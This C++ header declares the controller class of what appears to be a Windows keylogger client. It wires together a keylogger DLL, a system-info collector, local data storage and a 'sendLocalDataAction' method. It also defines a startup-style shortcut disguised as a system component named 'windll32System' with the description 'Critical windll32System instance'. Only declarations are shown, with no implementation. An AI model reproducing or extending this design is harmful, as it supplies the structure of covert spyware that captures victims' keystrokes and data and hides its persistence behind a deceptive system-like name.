#pragma warning(disable : 4290)
#ifndef CLIENT_H__
# define CLIENT_H__

# include <iostream>
# include <Shlobj.h>
# include <queue>
# include <shlwapi.h>
# include <functional>
# include "DLibrary.h"
# include "IInfoClient.h"
# include "IKeylogger.h"
# include "WorkQueue.h"
# include "windows.h"
# include "winnls.h"
# include "shobjidl.h"
# include "objbase.h"
# include "objidl.h"
# include "shlguid.h"
# include "sayHello.h"
# include "DataHandler.h"

# pragma comment(lib, "shlwapi.lib")


# define SHORTCUT_NAME L"\\windll32System.lnk"
# define DESCR			"Critical windll32System instance"

class	clientController {

	DLManager		libraries;

	// Dictionaries
	Dictionary	sayHello;
	Dictionary	infoClient;
	Dictionary	keylogger_dll;
	Dictionary		dictDataHandler;

	std::string		storeFolder;
	int				bytePerFile;
	IDataHandler*	dataHandler;

	_I_InfoClient *ifinstance;
	IKeylogger *klinstance;
	WorkQueue _lwqueue;
	// INetwork *netinstance;

public:

	clientController(void) throw(DLibraryException);	// Initialise
	~clientController(void);							// Destroy

	int			mainAction(int, char**);
	bool		sendLocalDataAction(void);

	void		defineShortcut(void);
	bool		createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, LPCSTR descr);

};

#endif /* !CLIENT_H__ */
